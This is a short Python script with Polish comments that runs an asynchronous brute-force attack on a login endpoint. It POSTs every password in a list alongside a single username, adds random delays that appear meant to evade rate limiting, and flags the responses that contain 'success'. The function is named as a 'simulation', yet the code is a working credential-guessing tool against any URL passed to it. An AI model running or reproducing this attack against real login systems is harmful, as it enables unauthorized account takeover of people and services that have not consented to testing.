import asyncio
import random
from aiohttp import ClientSession
from typing import List

async def simulate_brute_force(url: str, username: str, password_list: List[str]):
    """Optymalizacja: Asynchroniczne żądania zamiast sekwencyjnych"""
    async with ClientSession() as session:
        tasks = [
            _make_request(session, url, username, pwd)
            for pwd in password_list
        ]
        return await asyncio.gather(*tasks)

async def _make_request(session, url, username, password):
    await asyncio.sleep(random.uniform(0.1, 0.5))  # Losowe opóźnienia
    async with session.post(url, data={
        "username": username,
        "password": password
    }) as response:
        return {
            "password": password,
            "status": response.status,
            "success": "success" in await response.text()
        }